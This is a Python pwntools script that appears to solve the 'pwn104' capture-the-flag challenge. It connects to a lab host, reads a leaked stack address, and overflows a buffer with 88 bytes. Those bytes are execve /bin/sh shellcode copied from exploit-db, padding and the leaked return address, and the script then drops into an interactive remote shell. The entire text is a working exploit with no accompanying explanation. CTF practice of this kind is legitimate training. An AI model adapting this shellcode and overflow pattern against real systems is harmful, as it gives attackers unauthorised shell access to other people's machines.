#!/usr/bin/env python3

from pwn import *

io = process("./pwn104.pwn104")

io = remote("10.10.250.91", 9004)

io.recvuntil(b"at ")
ret_address = int(io.recvline().strip().decode('utf-8'), 16)
#https://www.exploit-db.com/exploits/46907
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

payload = shellcode + b"A"*(88 - len(shellcode)) + p64(ret_address)

io.sendline(payload)
io.interactive()
